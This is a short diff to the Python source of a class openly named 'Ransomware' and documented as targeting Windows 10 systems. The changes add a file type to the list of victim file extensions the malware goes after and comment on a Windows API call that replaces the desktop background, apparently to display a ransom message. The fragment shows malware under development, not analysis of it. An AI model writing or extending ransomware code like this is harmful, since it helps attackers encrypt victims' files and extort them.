@@ -7,11 +7,10 @@ import ctypes
 import sys
 
 
-
 class Ransomware:
     """Ransomware class for windows 10 systems"""
     
-    file_extensions = ['.txt', '.pdf', '.png', '.jpeg', '.docx', '.xlsx', '.doc', '.rtf', '.mp3']
+    file_extensions = ['.txt', '.pdf', '.png', 'jpg', '.jpeg', '.docx', '.xlsx', '.doc', '.rtf', '.mp3']
 
     def __init__(self):
         if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
@@ -92,5 +91,6 @@ class Ransomware:
 
     
     def update_background(self):
+        # not working atm... 
         ctypes.windll.user32.SystemParametersInfoW(20, 0, 'bg.png', 0)
         
